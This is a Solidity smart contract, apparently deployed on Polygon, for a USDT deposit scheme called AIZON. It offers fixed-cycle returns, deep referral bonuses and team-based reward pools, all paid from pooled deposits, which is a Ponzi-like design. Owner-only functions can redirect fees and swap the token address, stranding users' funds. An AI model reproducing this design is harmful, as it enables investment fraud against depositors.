/**
 *Submitted for verification at polygonscan.com on 2023-06-08
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.18;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract AIZON {
    using SafeMath for uint256;
    IERC20 public usdt;

    address payable internal owner;
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents1 = 300;
    uint256 private constant feePercents2 = 200;
    uint256 private constant feePercents3 = 100;
    uint256 private constant minDeposit = 50e6;
    uint256 private constant maxDeposit = 2000e6;
    uint256 private constant freezeIncomePercents = 3000;
    uint256 private constant timeStep = 1 days;
    uint256 private constant pooltimeStep = 15 days;
    uint256 private constant dayPerCycle = 10 days;

    uint256 private constant referDepth = 20;

    uint256[15] private ref_bonuses = [500, 100, 200, 50, 50, 250, 100, 50, 50, 50, 250, 50, 50, 50, 250];
    uint256[19] private cyclePercent = [250, 230, 210, 190, 170, 150, 150, 150, 150, 150, 150, 150, 150, 150, 150, 150, 150, 150, 50];

    uint256 private constant pool_percent = 33;

    uint256[5] private balDown = [10e10, 30e10, 100e10, 500e10, 1000e10];
    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000];
    uint256[5] private balRecover = [15e10, 50e10, 150e10, 500e10, 1000e10];
    mapping(uint256=>bool) public balStatus; // bal=>status

    address[3] public feeReceivers;

    address public defaultRefer;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser;

    uint256 public starPool;
    uint256 public starPool4;
    uint256 public starPool5;

    address[] public royalty_users1;
    address[] public royalty_users2;
    address[] public royalty_users3;

    struct OrderInfo {
        uint256 amount;
        uint256 start;
        uint256 unfreeze;
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        uint8 cycle;
        address referrer;
        uint256 referrals;
        uint256 start;
        uint256 level; // 0, 1, 2, 3, 4, 5
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 totalDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
        uint256 latestUnfreezeTime;
    }

    mapping(address=>UserInfo) public userInfo;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit; // day=>user=>amount
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo{
        uint256 match_bonus;
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 level5Freezed;
        uint256 star;
        uint256 luck;
        uint256 top;
        uint256 split;
        uint256 splitDebt;
    }

    mapping(address=>RewardInfo) public rewardInfo;

    bool public isFreezeReward;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event MatchPayout(address addr, address from, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);


    constructor(address _usdtAddr, address _defaultRefer, address[3] memory _feeReceivers) {
        usdt = IERC20(_usdtAddr);
        feeReceivers = _feeReceivers;
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = _defaultRefer;
        owner = payable(msg.sender);
    }

    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function deposit(uint256 _amount) external {
        usdt.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function depositBySplit(uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient split");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        _deposit(msg.sender, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }

    function distributePoolRewards() public {
        if(block.timestamp > lastDistribute.add(pooltimeStep)){
            _distributeStarPool();

            _distributeStarPool4();

            _distributeStarPool5();

            lastDistribute = block.timestamp;
        }
    }

    function withdraw() external {
        distributePoolRewards();

        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);
        uint256 splitAmt = staticSplit;
        uint256 withdrawable = staticReward;

        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);
        splitAmt = splitAmt.add(dynamicSplit);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);

        userRewards.statics = 0;
        userRewards.directs = 0;
        userRewards.luck = 0;
        userRewards.star = 0;
        userRewards.top = 0;
        userRewards.match_bonus = 0;

        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;

        usdt.transfer(msg.sender, withdrawable);
        emit Withdraw(msg.sender, withdrawable);
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for( uint256 i = 0; i < teamUsers[_user][0].length; i++ ){

            uint256 userTotalTeam = userInfo[ teamUsers[_user][0][i] ] .teamTotalDeposit.add(userInfo[ teamUsers[_user][0][i] ]. totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurSplit(address _user) public view returns(uint256){
        (, uint256 staticSplit) = _calCurStaticRewards(_user);
        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards( address _user ) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.luck.add(userRewards.star).add(userRewards.top).add(userRewards.match_bonus);
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

 function _refPayout(address _addr, uint256 _amount) private {
        UserInfo storage user = userInfo[_addr];
        address upline = user.referrer;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(upline == address(0)) break;


            if(userInfo[upline].referrals >= i + 1 ) {
                if(userInfo[upline].latestUnfreezeTime > block.timestamp) {
                    uint256 bonus = _amount * ref_bonuses[i] / baseDivider;
                    rewardInfo[upline].match_bonus = rewardInfo[upline].match_bonus.add(bonus);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(bonus);
                    emit MatchPayout(upline, _addr, bonus);
                }
            }

            upline = userInfo[upline].referrer;
        }
    }


    function _updateReferInfo( address _user, uint256 _amount ) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _calLevelNow(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _calLevelNow(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.maxDeposit;
        uint256 level = user.level;
        uint256 totalTeamDeposit = user.teamTotalDeposit;
        uint256 totaldirectDeposit = user.totalDirectDeposit;

        if(total >= 6e6){
          if(  level == 0 && total >= 500e6 && totalTeamDeposit >= 10000e6 && totaldirectDeposit >= 1000e6){

                user.level = 1;
                royalty_users1.push(_user);

           }else if( level == 1 && total >= 1000e6 && totalTeamDeposit >= 60000e6 && totaldirectDeposit >= 2500e6 ){

                user.level = 2;
                royalty_users2.push(_user);

            }else if( level == 2 && total >= 2000e6  && totalTeamDeposit >= 160000e6 && totaldirectDeposit >= 5000e6){

                user.level = 3;
                royalty_users3.push(_user);
            }
        }
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

         uint256 amt;
         address upline = user.referrer;

         if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
            userInfo[upline].totalDirectDeposit = userInfo[upline].totalDirectDeposit.add(_amount);
            amt = _amount;
        }else if(user.maxDeposit < _amount){
            amt = _amount - user.maxDeposit;
            user.maxDeposit = _amount;
            userInfo[upline].totalDirectDeposit = userInfo[upline].totalDirectDeposit.add(amt);
        }

        _distributeDeposit(_amount);

        depositors.push(_user);

        if(user.totalDeposit == 0) {
            userInfo[user.referrer].referrals = userInfo[user.referrer].referrals.add(1);
        }

        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        uint256 unfreezeTime = block.timestamp.add(15 days);
        user.latestUnfreezeTime = unfreezeTime;

        orderInfos[_user].push(OrderInfo(
            _amount,
            block.timestamp,
            unfreezeTime,
            false
        ));

        _unfreezeFundAndUpdateReward(msg.sender, _amount);

        distributePoolRewards();

        if(amt > 0) {
            _updateReferInfo(msg.sender, amt);
        }
        _refPayout(msg.sender, _amount);
     }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
                order.isUnfreezed = true;
                isUnfreezeCapital = true;

                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }

                uint256 _perRewards;
                if(user.cycle >= 18) {
                    _perRewards = 18;
                } else {
                    _perRewards = user.cycle;
                }

                uint256 staticReward = order.amount.mul(cyclePercent[_perRewards]).mul(dayPerCycle).div(timeStep).div(baseDivider);
                if(isFreezeReward){
                    if(user.totalFreezed > user.totalRevenue){
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital){
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);

                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);

                user.totalRevenue = user.totalRevenue.add(staticReward);

                user.cycle++;

                break;
            }
        }
    }

    function _distributeStarPool() private {
        uint256 level4Count;
        for(uint256 i = 0; i < royalty_users1.length; i++){
            if(userInfo[royalty_users1[i]].level == 1){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = starPool.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < royalty_users1.length; i++){
                if(userInfo[royalty_users1[i]].level == 1){
                    rewardInfo[royalty_users1[i]].star = rewardInfo[royalty_users1[i]].star.add(reward);
                    userInfo[royalty_users1[i]].totalRevenue = userInfo[royalty_users1[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(starPool > totalReward){
                starPool = starPool.sub(totalReward);
            }else{
                starPool = 0;
            }
        }
    }

    function _distributeStarPool4() private {
        uint256 level4Count;
        for(uint256 i = 0; i < royalty_users2.length; i++){
            if(userInfo[royalty_users2[i]].level == 2){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = starPool4.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < royalty_users2.length; i++){
                if(userInfo[royalty_users2[i]].level == 2){
                    rewardInfo[royalty_users2[i]].luck = rewardInfo[royalty_users2[i]].luck.add(reward);
                    userInfo[royalty_users2[i]].totalRevenue = userInfo[royalty_users2[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(starPool4 > totalReward){
                starPool4 = starPool4.sub(totalReward);
            }else{
                starPool4 = 0;
            }
        }
    }

    function _distributeStarPool5() private {
        uint256 level4Count;
        for(uint256 i = 0; i < royalty_users3.length; i++){
            if(userInfo[royalty_users3[i]].level == 3){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = starPool5.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < royalty_users3.length; i++){
                if(userInfo[royalty_users3[i]].level == 3){
                    rewardInfo[royalty_users3[i]].top = rewardInfo[royalty_users3[i]].top.add(reward);
                    userInfo[royalty_users3[i]].totalRevenue = userInfo[royalty_users3[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(starPool5 > totalReward){
                starPool5 = starPool5.sub(totalReward);
            }else{
                starPool5 = 0;
            }
        }
    }



    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents1).div(baseDivider);//3
        uint256 fees = _amount.mul(feePercents2).div(baseDivider);//2
        uint256 feess = _amount.mul(feePercents3).div(baseDivider);//1

        usdt.transfer(feeReceivers[0], fee);
        usdt.transfer(feeReceivers[1], fees);
        usdt.transfer(feeReceivers[2], feess);

        uint256 luck = _amount.mul(pool_percent).div(baseDivider);
        starPool = starPool.add(luck);

        uint256 star = _amount.mul(pool_percent).div(baseDivider);
        starPool4 = starPool4.add(star);

        uint256 top = _amount.mul(pool_percent).div(baseDivider);
        starPool5 = starPool5.add(top);
    }

    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = false;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }

    function _updateFeeReceivers(address[3] memory _feeReceivers) external {
        require(msg.sender == owner, "Permission denied");
        feeReceivers = _feeReceivers;
    }

    function _updateTokenAddress(address _usdtAddr) external {
        require(msg.sender == owner, "Permission denied");
        usdt = IERC20(_usdtAddr);
    }
}